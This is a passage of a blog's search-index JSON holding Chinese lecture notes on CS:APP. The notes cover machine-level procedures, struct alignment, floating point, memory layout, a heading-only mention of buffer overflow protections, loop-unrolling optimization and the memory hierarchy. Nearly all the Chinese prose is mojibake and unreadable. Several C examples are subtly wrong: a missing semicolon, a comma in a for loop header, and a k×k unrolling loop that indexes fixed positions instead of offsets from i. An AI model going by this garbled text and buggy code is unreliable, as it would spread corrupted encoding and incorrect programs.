¹æ®æ•´æ•°ç´¢å¼•å¾—åˆ°å¯¹åº”çš„ä»£ç åœ°å€åï¼Œå°±å¯ä»¥ç›´æ¥è·³è½¬åˆ°å¯¹åº”çš„ä»£ç å—ã€‚ç›¸æ¯”å¾ˆé•¿çš„if-elseè¯­å¥çš„ä¼˜åŠ¿åœ¨äºï¼šæ‰§è¡Œswitchè¯­å¥çš„æ—¶é—´ä¸åˆ†æ”¯æ•°ç›®æ— å…³ï¼Œåªéœ€è¦è®¡ç®—ä¸€æ¬¡åç§»ã€‚ ","date":"2021-01-25","objectID":"/csapp-lecture-03/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#å¾ªç¯"},{"categories":["Pwning"],"content":"Machine-Level Programming â…¢: Procedureså‡½æ•°è°ƒç”¨çº¦å®šã€‚ stackçš„æ€æƒ³ï¼Œpopä¸pushæŒ‡ä»¤ã€‚ ä¿å­˜åˆ°å†…å­˜ä¸­è¿›è¡Œå‚æ•°ä¼ è¾“æ—¶ï¼Œè¦æ±‚æ¯ä¸ªå‚æ•°å¤§å°ä¸º8å­—èŠ‚çš„å€æ•°ï¼Œå³è¦æ±‚ç›¸å¯¹%rspçš„åç§»é‡ä¸º8çš„å€æ•° call: ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€å…¥æ ˆï¼Œæ ˆåœ°å€rbpå…¥æ ˆï¼Œripå˜ä¸ºç›®çš„åœ°å€ã€‚è¿”å›å€¼æ”¾å…¥rax ","date":"2021-01-25","objectID":"/csapp-lecture-03/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#machine-level-programming--procedures"},{"categories":["Pwning"],"content":"Machine-Level Programming â…£: Dataç»“æ„ä½“çš„å†…å­˜åˆ†å¸ƒ ç»“æ„çš„æ‰€æœ‰ç»„æˆéƒ¨åˆ†éƒ½å­˜æ”¾åœ¨å†…å­˜ä¸­ä¸€æ®µè¿ç»­çš„åŒºåŸŸå†…ï¼ŒæŒ‡å‘ç»“æ„çš„æŒ‡é’ˆæ˜¯ç»“æ„ç¬¬ä¸€å­—èŠ‚çš„åœ°å€ã€‚ è¦æ±‚ç»“æ„çš„åˆå§‹åœ°å€ä¸€å®šæ˜¯ç»“æ„ä½“ä¸­æœ€å¤§å¯¹è±¡å¤§å°çš„å€æ•°ï¼Œä½¿å¾—åç§»é‡åŠ ä¸Šåˆå§‹åœ°å€æ‰æ˜¯çœŸçš„æ»¡è¶³å€æ•°å…³ç³»çš„ã€‚ åœ¨ç»“æ„ä½“æœ«å°¾å¡«å……ï¼Œä½¿å…¶æ˜¯ç»“æ„ä½“ä¸­æœ€å¤§å¯¹è±¡å¤§å°çš„å€æ•°ï¼Œä½¿å¾—ç»“æ„æ•°ç»„ä¸­ä¸‹ä¸€ä¸ªå…ƒç´ çš„åœ°å€ä¹Ÿæ˜¯æˆå€æ•°å…³ç³»çš„ã€‚æˆ‘ä»¬å¯ä»¥æ”¹å˜å£°æ˜çš„é¡ºåºï¼ŒæŒ‰ç…§ä»å¤§åˆ°å°çš„å½¢å¼è¿›è¡Œå£°æ˜ï¼Œå¯ä»¥å‡å°‘å¡«å……çš„å­—èŠ‚æ•°ç›®ï¼ŒèŠ‚çœè¯¥ç»“æ„çš„ç©ºé—´å¤§å° å¯¹é½åŸåˆ™æ˜¯ä»»ä½•Kå­—èŠ‚çš„åŸºæœ¬å¯¹è±¡çš„åœ°å€å¿…é¡»æ˜¯Kçš„å€æ•° å…±ç”¨ä½“çš„å†…å­˜åˆ†å¸ƒ ä¿å­˜åœ¨å…¬å…±çš„ä¸€å—å†…å­˜ä¸­ï¼Œé€šè¿‡ä¸åŒå¯¹è±¡çš„ç±»å‹æ¥èµ‹äºˆè¿™å—å†…å­˜ä¸åŒçš„å«ä¹‰ã€‚å†…å­˜å¤§å°ä¸ºæœ€å¤§å­—æ®µçš„å¤§å°ã€‚ å¦‚æœæˆ‘ä»¬äº‹å…ˆçŸ¥é“ä¸¤ä¸ªä¸åŒå­—æ®µæ˜¯äº’æ–¥çš„ï¼Œå°±èƒ½å°†å…¶å®šä¹‰åœ¨ä¸€ä¸ªunionä¸­ï¼Œå°±èƒ½èŠ‚çœå†…å­˜ç©ºé—´ã€‚ ","date":"2021-01-25","objectID":"/csapp-lecture-03/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#machine-level-programming--data"},{"categories":["Pwning"],"content":"æ•°ç»„ä¸æŒ‡é’ˆè¿ç®—åœ¨cè¯­è¨€ä¸­ï¼ŒäºŒç»´æ•°ç»„çš„å®šä¹‰ï¼šchar buf[x][y]ï¼Œå…¶ä¸­xå¯ç¼ºçœï¼Œyä¸èƒ½ç¼ºçœã€‚å¯¹äºäºŒç»´æ•°ç»„ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·ç†è§£ï¼šäºŒç»´æ•°ç»„æ˜¯ä¸€ç»´æ•°ç»„çš„åµŒå¥—ï¼Œå³ä¸€ç»´æ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ ä¸ºåŒç±»å‹æ•°ç»„ã€‚ ä¾‹å¦‚ï¼šchar array[3][3],æˆ‘ä»¬å¯ä»¥å°†å…¶ç†è§£æˆarrayæ•°ç»„æ˜¯ä¸€ä¸ªä¸€ç»´æ•°ç»„ï¼Œæ•°ç»„çš„å…ƒç´ åˆ†åˆ«æ˜¯array[0],array[1],array[2]ä¸‰ä¸ªchar[3]å‹æ•°ç»„ã€‚ è€Œå¯¹äºä¸€ä¸ªæ•°ç»„å…ƒç´ çš„è®¿é—®ï¼Œcæ˜¯è¿™æ ·å®ç°çš„ï¼šå…ˆå–å‡ºæ•°ç»„é¦–å…ƒç´ åœ°å€ï¼Œç›®æ ‡å…ƒç´ åœ°å€=é¦–åœ°å€+sizeof(type)*Nï¼Œå¾—åˆ°è¢«è®¿é—®å…ƒç´ çš„åœ°å€ï¼Œtypeæ˜¯æŒ‡é’ˆæŒ‡å‘æ•°æ®ç±»å‹ã€‚ å¦‚ä¸Šé¢æåˆ°çš„arrayï¼Œå®ƒæ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„çš„å‡½æ•°åå…¶æ¯ä¸ªå…ƒç´ ä¸ºä¸€ä¸ªè¡Œæ•°ç»„ï¼Œå®ƒå°±æ˜¯æ•°ç»„æŒ‡é’ˆï¼Œåœ¨è¿™ä¸ªæŒ‡é’ˆä¸ŠåŠ å‡ä¸€ä¸ªæ•´æ•°éƒ½æ˜¯ç§»åŠ¨æ•´è¡Œã€‚ è€Œarray[0],array[1],array[2]å…¶æ¯ä¸ªå…ƒç´ ä¸ºä¸€ä¸ªcharï¼Œå°†å®ƒä»¬è§†ä½œå•ç‹¬çš„æ•°ç»„ï¼Œé‚£ä¹ˆå…¶å‡½æ•°åå°±æ˜¯æŒ‡é’ˆï¼åœ¨å…¶ä¸Šè¿›è¡ŒåŠ å‡æ˜¯å¯¹ç§»åŠ¨ä¸€ä¸ªtype(char)çš„å¤§å°ã€‚ æ³¨æ„ï¼ŒåŒºåˆ«æŒ‡é’ˆæ•°ç»„ï¼ŒæŒ‡é’ˆæ•°ç»„çš„å…ƒç´ æ˜¯æŒ‡é’ˆã€‚ ä¸€ä¸ªé‡è¦çš„æ•°æ®è®¿é—®æ€æƒ³ï¼šåŸºå€+offset ","date":"2021-01-25","objectID":"/csapp-lecture-03/:0:1","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#æ•°ç»„ä¸æŒ‡é’ˆè¿ç®—"},{"categories":["Pwning"],"content":"æµ®ç‚¹æ•°åœ¨æµ®ç‚¹è¿ç®—ä¸­ï¼ŒæŒ‡ä»¤è¢«åˆ†æˆäº†æ ‡é‡æŒ‡ä»¤ï¼ˆScalar Operationsï¼‰å’ŒSIMDæŒ‡ä»¤ï¼Œåœ¨æŒ‡ä»¤ä¸­åˆ†åˆ«ç”¨så’Œpè¡¨ç¤ºã€‚ æ ‡é‡æŒ‡ä»¤åªå¯¹ä½4å­—èŠ‚æˆ–8å­—èŠ‚è¿›è¡Œæ“ä½œï¼Œè€Œå‘é‡æŒ‡ä»¤ä¼šå¯¹å…¶ä»–çš„å­—èŠ‚é‡‡å–å¹¶è¡Œçš„æ“ä½œã€‚ æµ®ç‚¹ä¼ é€ å…¶ä¸­ï¼Œæœ€åä¸¤ä¸ªæŒ‡ä»¤çš„aè¡¨ç¤ºå¯¹é½ï¼Œå½“è¯»å†™å†…å­˜æ—¶ï¼Œè¦æ±‚æ»¡è¶³16å­—èŠ‚å¯¹é½ï¼ˆå› ä¸ºXMMæ˜¯16å­—èŠ‚çš„ï¼‰ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚ ä¼ å…¥å‚æ•°ï¼Œå¦‚æœæ˜¯æµ®ç‚¹æ•°ï¼Œå°±ä¿å­˜åœ¨XMMå¯„å­˜å™¨ä¸­ï¼Œå¦‚æœæ˜¯æŒ‡é’ˆæˆ–æ•´å‹ï¼Œå°±ä¿å­˜åœ¨å¸¸è§„å¯„å­˜å™¨ä¸­ã€‚è€Œè¿”å›å€¼ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ æµ®ç‚¹è½¬æ¢ æµ®ç‚¹æ•°â€“\u003eæ•´å‹ æ•´å‹â€“\u003eæµ®ç‚¹æ•° åœ¨æ•´å‹è½¬æ¢æˆæµ®ç‚¹æ•°æ—¶ï¼Œæä¾›äº†ä¸‰æ“ä½œæ•°æŒ‡ä»¤ï¼Œè¿™é‡Œé€šå¸¸å¯ä»¥å¿½ç•¥ç¬¬äºŒä¸ªæ“ä½œæ•°ï¼Œå› ä¸ºå®ƒçš„å€¼åªä¼šå½±å“é«˜ä½å­—èŠ‚ï¼Œé€šå¸¸ä½¿ç”¨ç›®çš„å¯„å­˜å™¨ã€‚ è¿ç®—æ“ä½œ å’Œæ•´æ•°è¿ç®—æ“ä½œä¸åŒï¼ŒAVXæµ®ç‚¹æ“ä½œä¸èƒ½ç”¨ç«‹å³æ•°ä½œä¸ºå¸¸æ•°ã€‚ç¼–è¯‘å™¨ä¼šä¸ºæµ®ç‚¹å¸¸æ•°åˆ†é…å’Œåˆå§‹åŒ–å­˜å‚¨ç©ºé—´ï¼Œç„¶åä»£ç å†ä»å†…å­˜ä¸­è¯»å–è¿™äº›å€¼ã€‚æ¯”å¦‚ä»¥ä¸‹ä»£ç  æµ®ç‚¹æ•°ä½çº§æ“ä½œ æ¯”è¾ƒæ“ä½œ ","date":"2021-01-25","objectID":"/csapp-lecture-03/:0:2","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#æµ®ç‚¹æ•°"},{"categories":["Pwning"],"content":"Machine-Level Programmingâ…¤: Advanced Topics","date":"2021-01-25","objectID":"/csapp-lecture-03/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#machine-level-programming-advanced-topics"},{"categories":["Pwning"],"content":"Linuxçš„å†…å­˜ç»“æ„ï¼š Stack 8MB limit Heap Dynamically allocated as needed malloc, calloc, new Data statically allocated data Text / Shared Libraries read-only executable machine instructions ","date":"2021-01-25","objectID":"/csapp-lecture-03/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#linuxçš„å†…å­˜ç»“æ„"},{"categories":["Pwning"],"content":"Buffer overflow","date":"2021-01-25","objectID":"/csapp-lecture-03/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#buffer-overflow"},{"categories":["Pwning"],"content":"ä¿æŠ¤æœºåˆ¶ ASLR æ ˆåœ°å€éšæœºåŒ– Canary é‡‘ä¸é›€ä¿æŠ¤ï¼Œæ ˆç ´åéšæœºåŒ– NX é™åˆ¶å¯æ‰§è¡Œä»£ç åŒºåŸŸ ROP ","date":"2021-01-25","objectID":"/csapp-lecture-03/:2:1","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#ä¿æŠ¤æœºåˆ¶"},{"categories":["Pwning"],"content":"Lecture 05: Program Optimizationç¨‹åºçš„æ€§èƒ½ï¼šå¼•å…¥æ¯å…ƒç´ å‘¨æœŸæ•°ï¼ˆCycles Per Elementï¼Œ CPEï¼‰ä½œä¸ºè¡¡é‡æ ‡å‡†ã€‚å› ä¸ºå¤„ç†å™¨çš„æ´»åŠ¨é¡ºåºæ˜¯ç”±æ—¶é’Ÿæ§åˆ¶çš„ï¼Œæ—¶é—´é•¿çŸ­ä»£è¡¨æ‰§è¡Œçš„æŒ‡ä»¤æ•°ç›®ã€‚ ","date":"2021-01-25","objectID":"/csapp-lecture-05/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 05","uri":"/csapp-lecture-05/#lecture-05-program-optimization"},{"categories":["Pwning"],"content":"é€šç”¨çš„æœ‰æ•ˆä¼˜åŒ–ä»£ç ç§»åŠ¨(Code Motion)ï¼šå…ˆè®¡ç®—éœ€è¦è®¡ç®—çš„å€¼ï¼Œç„¶ååœ¨ä¹‹åä¸€ç›´ä½¿ç”¨è¿™ä¸ªå€¼ void set_row(double *a, double *b, long i, long n) { long j; for(j = 0; j \u003c n; j++) a[n*i+j]=b[j]; } åœ¨è¿™ä¸ªä¾‹å­ä¸­æ¯æ¬¡å¾ªç¯éƒ½ä¼šè®¡ç®—n*iï¼Œå³å¤šäº†å¾ˆå¤šä¸å¿…è¦çš„ä¹˜æ³•è¿ç®—ã€‚çœ‹ä¸‹é¢çš„ä¼˜åŒ– void set_row(double *a, double *b, long i, long n) { long j; int ni=n*i for(j = 0; j \u003c n; j++) a[ni+j]=b[j]; } è®¡ç®—é‡å‡å°‘ï¼šå°†ä¹˜æ³•è½¬åŒ–ä¸ºåŠ æ³• å…±äº«é€šç”¨è¡¨è¾¾ï¼šé€šè¿‡æŠ½å–å­è¡¨è¾¾å¼ï¼Œå°†å…¶æå‰è½¬åŒ–ä¸ºå…±äº«å˜é‡çš„æ–¹å¼å‡å°‘è®¡ç®—é‡ int v1 = a[n*i+j*0]; int v2 = a[n*i+j*1]; int v3 = a[n*i+j*2]; ä¼˜åŒ– int ni=n*i int v1 = a[ni+j*0]; int v2 = a[ni+j*1]; int v3 = a[ni+j*2]; ","date":"2021-01-25","objectID":"/csapp-lecture-05/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 05","uri":"/csapp-lecture-05/#é€šç”¨çš„æœ‰æ•ˆä¼˜åŒ–"},{"categories":["Pwning"],"content":"Loop Unrolling å¾ªç¯å±•å¼€ void psum1(float a[], float p[], long n){ long i; p[0] = a[0]; for(i=1, i\u003cn; i++){ p[i] = p[i-1]+a[i]; } } void psum2(float a[], float p[], long n){ long i; p[0] = a[0]; for(i=1; i\u003cn-1; i+=2){ float mid_val = p[i-1]+a[i]; p[i] = mid_val; p[i+1] = mid_val+a[i+1]; } if(i\u003cn){ p[i] = p[i-1]+a[i]; } } kx1å¾ªç¯å±•å¼€ å°†ä¸€ä¸ªå¾ªç¯å±•å¼€æˆäº†ä¸¤éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æ˜¯æ¯æ¬¡å¾ªç¯å¤„ç†kä¸ªå…ƒç´ ï¼Œèƒ½å¤Ÿå‡å°‘å¾ªç¯æ¬¡æ•°ï¼›ç¬¬äºŒéƒ¨åˆ†å¤„ç†å‰©ä¸‹è¿˜æ²¡è®¡ç®—çš„å…ƒç´ ï¼Œæ˜¯é€ä¸ªè¿›è¡Œè®¡ç®—çš„ã€‚ #define k 2 void combine5(vec_ptr v, data_t *dest){ long i; long length = vec_length(v); long limit = length-k+1; data_t *data = get_vec_start(v); data_t acc = IDENT; for(i=0; i\u003climit; i+=k){ acc = ((acc OP data[i]) OP data[i+1]) ... OP data[i+k-1]; } for(; i\u003clength; i++){ acc = acc OP data[i]; } return acc; } kxkå¾ªç¯å±•å¼€ å°†ä¸€ä¸ªå¾ªç¯å±•å¼€æˆäº†ä¸¤éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æ˜¯æ¯æ¬¡å¾ªç¯å¤„ç†kä¸ªå…ƒç´ ï¼Œèƒ½å¤Ÿå‡å°‘å¾ªç¯æ¬¡æ•°ï¼Œå¹¶ä¸”å¼•å…¥kä¸ªå˜é‡ä¿å­˜ç»“æœï¼›ç¬¬äºŒéƒ¨åˆ†å¤„ç†å‰©ä¸‹è¿˜æ²¡è®¡ç®—çš„å…ƒç´ ï¼Œæ˜¯é€ä¸ªè¿›è¡Œè®¡ç®—çš„ã€‚ #define K 2 void combine6(vec_ptr v, data_t *dest){ long i; long length = vec_length(v); long limit = length-k+1; data_t *data = get_vec_start(v); data_t acc0 = IDENT; data_t acc1 = IDENT; ... data_t acck_1 = IDENT; //kä¸ªå˜é‡ for(i=0; i\u003climit; i+=k){ acc0 = acc0 OP data[0]; acc1 = acc1 OP data[1]; ... acck_1 = acck_1 OP data[k-1]; //æ›´æ–°kä¸ªå˜é‡ } for(; i\u003clength; i++){ acc0 = acc0 OP data[i]; } *dest = acc0 OP acc1 OP ... OP acck_1; } ","date":"2021-01-25","objectID":"/csapp-lecture-05/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 05","uri":"/csapp-lecture-05/#loop-unrolling-å¾ªç¯å±•å¼€"},{"categories":["Pwning"],"content":"Lecture 06: The Memory Hierarchy","date":"2021-01-25","objectID":"/csapp-lecture-06/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 06","uri":"/csapp-lecture-06/#lecture-06-the-memory-hierarchy"},{"categories":["Pwning"],"content":"å­˜å‚¨æŠ€æœ¯","date":"2021-01-25","objectID":"/csapp-lecture-06/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 06","uri":"/csapp-lecture-06/#å­˜å‚¨æŠ€æœ¯"},{"categories":["Pwning"],"content":"éšæœºè®¿é—®å­˜å‚¨å™¨**éšæœºè®¿é—®å­˜å‚¨å™¨ï¼ˆRandom-Access Memoryï¼ŒRAMï¼‰**æ ¹æ®å­˜å‚¨å•å…ƒå®ç°æ–¹å¼å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼šé™æ€çš„RAMï¼ˆSRAMï¼‰å’ŒåŠ¨æ€çš„RAMï¼ˆDRAMï¼‰ã€‚ SRAM ç”±äºå…·æœ‰åŒç¨³æ€ï¼Œæ‰€ä»¥åªè¦æœ‰ç”µï¼Œå°±ä¼šæ°¸è¿œä¿æŒå®ƒçš„å€¼ï¼Œå³ä½¿æœ‰å¹²æ‰°ï¼Œå½“å¹²æ‰°æ¶ˆé™¤æ—¶å°±ä¼šæ¢å¤åˆ°ç¨³æ€ DRAM ç”±äºæ¯ä¸ªå­˜å‚¨å•å…ƒæ¯”è¾ƒå°ï¼ŒDRAMå¯ä»¥åˆ¶é€ çš„ååˆ†å¯†é›†ï¼Œå¯ä»¥ä½œä¸ºä¸»å­˜æˆ–å›¾å½¢ç³»ç»Ÿçš„å¸§ç¼“å†²åŒºã€‚ ç”±äºé€šè¿‡ç”µå®¹ç”µå‹æ¥ä¿å­˜ä½ï¼Œå½“ç”µå®¹ç”µå‹å—åˆ°æ‰°åŠ¨æ—¶å°±æ— æ³•æ¢å¤äº†ã€‚å¹¶ä¸”ç”µå®¹å­˜åœ¨æ¼ç”µç°è±¡ï¼Œå­˜å‚¨å•å…ƒ10~100æ¯«ç§’ä¼šå¤±å»ç”µè·ï¼Œä½¿å¾—å†…å­˜ç³»ç»Ÿå¿…é¡»å‘¨æœŸæ€§é€šè¿‡è¯»å‡ºé‡å†™æ¥åˆ·æ–°å†…å­˜çš„æ¯ä¸€ä½ã€‚ æš´éœ²åœ¨å…‰çº¿ä¸­ä¼šå¯¼è‡´ç”µå®¹ç”µå‹æ”¹å˜ã€‚ ","date":"2021-01-25","objectID":"/csapp-lecture-06/:1:1","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 06","uri":"/csapp-lecture-06/#éšæœºè®¿é—®å­˜å‚¨å™¨"},{"categories":["Pwning"],"content":"éæ˜“å¤±æ€§å­˜å‚¨å™¨ä¹‹å‰ä»‹ç»çš„DRAMå’ŒSRAMåœ¨æ–­ç”µæ—¶éƒ½ä¼šä¸¢å¤±æ•°æ®ï¼Œæ‰€ä»¥æ˜¯æ˜“å¤±çš„ï¼ˆVolatileï¼‰ï¼Œè€Œéæ˜“å¤±æ€§å­˜å‚¨å™¨ï¼ˆNonvolatile Memoryï¼‰å³ä½¿æ–­ç”µåï¼Œä¹Ÿä¼šä¿å­˜ä¿¡æ¯ï¼Œè¯¥ç±»å­˜å‚¨å™¨ç§°ä¸ºåªè¯»å­˜å‚¨å™¨ï¼ˆRead-Only Memoryï¼ŒROMï¼‰ï¼Œä½†æ˜¯ç°åœ¨ROMä¸­æœ‰çš„ç±»å‹æ—¢å¯ä»¥è¯»ä¹Ÿå¯ä»¥å†™äº†ï¼Œå¯ä»¥æ ¹æ®ROMèƒ½å¤Ÿé‡ç¼–ç¨‹çš„æ¬¡æ•°ä»¥åŠå¯¹å®ƒä»¬è¿›è¡Œé‡ç¼–ç¨‹æ‰€ç”¨çš„æœºåˆ¶è¿›è¡ŒåŒºåˆ†ï¼ŒåŒ…æ‹¬ï¼š **å¯ç¼–ç¨‹ROMï¼ˆPROMï¼‰ï¼š**å¯ä»¥ç¼–ç¨‹ä¸€æ¬¡ **å¯æ“¦å†™PROMï¼ˆEPROMï¼‰ï¼š**å¯ä»¥æ‰¹é‡æ“¦é™¤ **é—ªå­˜ï¼ˆFlash Memoryï¼‰ï¼š**å…·æœ‰éƒ¨åˆ†ï¼ˆå—çº§ï¼‰æ“¦é™¤åŠŸèƒ½ï¼Œå¤§çº¦æ“¦é™¤åä¸‡æ¬¡åä¼šè€—å°½ å­˜å‚¨åœ¨ROMè®¾å¤‡ä¸­çš„ç¨‹åºç§°ä¸ºå›ºä»¶ï¼ˆFirmwareï¼‰ï¼ŒåŒ…æ‹¬BIOSã€ç£ç›˜æ§åˆ¶å™¨ã€ç½‘å¡ã€å›¾å½¢åŠ é€Ÿå™¨å’Œå®‰å…¨å­ç³»ç»Ÿç­‰ã€‚å½“è®¡ç®—æœºç³»ç»Ÿé€šç”µåï¼Œä¼šè¿è¡Œå­˜å‚¨åœ¨ROMä¸­çš„å›ºä»¶ã€‚ ","date":"2021-01-25","objectID":"/csapp-lecture-06/:1:2","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 06","uri":"/csapp-lecture-06/#éæ˜“å¤±æ€§å­˜å‚¨å™¨"},{"categories":["Pwning"],"content":"ç£ç›˜å­˜å‚¨**ç£ç›˜ï¼ˆDiskï¼‰**æ˜¯è¢«ç”¨æ¥ä¿å­˜å¤§é‡æ•°æ®çš„å­˜å‚¨è®¾å¤‡ï¼Œä½†æ˜¯è¯»ä¿¡æ¯çš„é€Ÿåº¦æ¯”DRAMæ…¢10ä¸‡å€ï¼Œæ¯”SRAMæ…¢100ä¸‡å€ã€‚ ç£ç›˜æ˜¯ç”±å¤šä¸ªå æ”¾åœ¨ä¸€èµ·çš„ç›˜ç‰‡ï¼ˆPlatterï¼‰æ„æˆï¼Œæ¯ä¸ªç›˜ç‰‡æœ‰ä¸¤ä¸ªè¦†ç›–ç€ç£æ€§è®°å½•ææ–™çš„è¡¨é¢ï¼ˆSurfaceï¼‰ã€‚æ¯ä¸ªè¡¨é¢ç”±ä¸€ç»„ç§°ä¸ºç£é“ï¼ˆTrackï¼‰çš„åŒå¿ƒåœ†ç»„æˆï¼Œæ¯ä¸ªç£é“è¢«åˆ’åˆ†ä¸ºè‹¥å¹²æ‰‡åŒºï¼ˆSectorï¼‰ï¼Œæ¯ä¸ªæ‰‡åŒºåŒ…å«ç›¸åŒæ•°é‡çš„æ•°æ®ä½ï¼ˆé€šå¸¸ä¸º512å­—èŠ‚ï¼‰ä½œä¸ºè¯»å†™æ•°æ®çš„åŸºæœ¬å•ä½ã€‚æ‰‡åŒºä¹‹é—´é€šè¿‡é—´éš™ï¼ˆGapï¼‰åˆ†éš”å¼€æ¥ï¼Œé—´éš™ä¸ä¿å­˜æ•°æ®ä¿¡æ¯ï¼Œåªç”¨æ¥è¡¨ç¤ºæ‰‡åŒºçš„æ ¼å¼åŒ–ä½ã€‚é€šå¸¸ä¼šä½¿ç”¨æŸ±é¢ï¼ˆCylinderï¼‰æ¥æè¿°ä¸åŒè¡¨é¢ä¸Šç›¸åŒç£é“çš„é›†åˆï¼Œæ¯”å¦‚æŸ±é¢kå°±æ˜¯6ä¸ªè¡¨é¢ä¸Šç£é“kçš„é›†åˆã€‚ç›˜ç‰‡ä¸­å¤®ä¼šæœ‰ä¸€ä¸ªå¯ä»¥æ—‹è½¬çš„ä¸»è½´ï¼ˆSpindleï¼‰ï¼Œä½¿å¾—ç›˜ç‰‡ä»¥å›ºå®šçš„æ—‹è½¬é€Ÿç‡ï¼ˆRotational Rateï¼‰æ—‹è½¬ï¼Œå•ä½é€šå¸¸ä¸ºRPMï¼ˆRevolution Per Minuteï¼‰ã€‚ å°†ç£ç›˜èƒ½è®°å½•çš„æœ€å¤§ä½æ•°ç§°ä¸ºæœ€å¤§å®¹é‡ï¼ˆå®¹é‡ï¼‰ï¼Œä¸»è¦ç”±ä»¥ä¸‹æ–¹é¢å†³å®šï¼š **è®°å½•å¯†åº¦ï¼ˆRecording Densityï¼‰ï¼š**ä¸€è‹±å¯¸çš„ç£é“ä¸­å¯ä»¥æ”¾å…¥çš„ä½æ•° **ç£é“å¯†åº¦ï¼ˆTrack Densityï¼‰ï¼š**ä»ç›˜ç‰‡ä¸­å¿ƒå‡ºå‘ï¼Œæ²¿ç€åŠå¾„æ–¹å‘ä¸€è‹±å¯¸ï¼ŒåŒ…å«å¤šå°‘ç£é“ **é¢å¯†åº¦ï¼ˆAreal Densityï¼‰ï¼š**è®°å½•å¯†åº¦å’Œç£é“å¯†åº¦çš„ä¹˜ç§¯ åœ¨é¢å¯†åº¦è¾ƒä½æ—¶ï¼Œæ¯ä¸ªç£é“éƒ½è¢«åˆ†æˆäº†ç›¸åŒçš„æ‰‡åŒºï¼Œæ‰€ä»¥èƒ½å¤Ÿåˆ’åˆ†çš„æ‰‡åŒºæ•°ç”±æœ€å†…ä¾§ç£é“èƒ½è®°å½•çš„æ‰‡åŒºæ•°å†³å®šï¼Œè¿™å°±ä½¿å¾—å¤–ä¾§çš„ç£é“å…·æœ‰å¾ˆå¤šé—´éš™ã€‚ç°ä»£å¤§å®¹é‡ç£ç›˜é‡‡ç”¨**å¤šåŒºè®°å½•ï¼ˆMultiple Zone Recordingï¼‰**æŠ€æœ¯ï¼Œå°†ä¸€ç»„è¿ç»­çš„æŸ±é¢åˆ’åˆ†æˆä¸€ä¸ªåŒºï¼Œåœ¨åŒä¸€ä¸ªåŒºä¸­ï¼Œæ¯ä¸ªæŸ±é¢çš„æ¯æ¡ç£é“éƒ½æœ‰ç›¸åŒæ•°é‡çš„æ‰‡åŒºï¼Œç”±è¯¥åŒºä¸­æœ€å†…ä¾§çš„ç£é“å†³å®šï¼Œç”±æ­¤ä½¿å¾—å¤–ä¾§çš„åŒºèƒ½åˆ’åˆ†æˆæ›´å¤šçš„æ‰‡åŒºã€‚ ç£ç›˜é€šè¿‡ä¸€ä¸ªè¿æ¥åœ¨**ä¼ åŠ¨è‡‚ï¼ˆActuator Armï¼‰ä¸Šçš„è¯»/å†™å¤´ï¼ˆRead/Write Headï¼‰æ¥è¿›è¡Œè¯»å†™ï¼Œå¯¹äºæœ‰å¤šä¸ªç›˜é¢çš„ç£ç›˜ï¼Œä¼šç”¨å¤šä¸ªä½äºåŒä¸€æŸ±é¢ä¸Šçš„å‚ç›´æ’åˆ—çš„è¯»/å†™å¤´ã€‚å¯¹äºæ‰‡åŒºçš„è®¿é—®æ—¶é—´ï¼ˆAccess Timeï¼‰**ç”±ä»¥ä¸‹å‡ éƒ¨åˆ†æ„æˆï¼š **å¯»é“æ—¶é—´ï¼š**ä¸ºäº†è¯»å–åˆ°ç›®æ ‡æ‰‡åŒºï¼Œä¼šå…ˆæ§åˆ¶ä¼ åŠ¨è‡‚å°†è¯»/å†™å¤´ç§»åŠ¨åˆ°è¯¥æ‰‡åŒºå¯¹åº”çš„ç£é“ä¸Šï¼Œè¯¥æ—¶é—´ç§°ä¸ºå¯»é“æ—¶é—´ã€‚ä¾èµ–äºè¯»/å†™å¤´ä¹‹å‰çš„ä½ç½®ï¼Œä»¥åŠä¼ åŠ¨è‡‚åœ¨ç›˜é¢ä¸Šç§»åŠ¨çš„é€Ÿåº¦ã€‚ **æ—‹è½¬æ—¶é—´ï¼š**å½“è¯»/å†™å¤´å¤„äºç›®æ ‡ç£é“æ—¶ï¼Œéœ€è¦ç­‰å¾…ç›®æ ‡æ‰‡åŒºçš„ç¬¬ä¸€ä¸ªä½æ—‹è½¬åˆ°è¯»/å†™å¤´ä¸‹ **ä¼ é€æ—¶é—´ï¼š**å½“è¯»/å†™å¤´å¤„äºç›®æ ‡æ‰‡åŒºçš„ç¬¬ä¸€ä½æ—¶ï¼Œå°±å¯ä»¥è¿›è¡Œä¼ é€äº† ç”±äºç£ç›˜æ„é€ 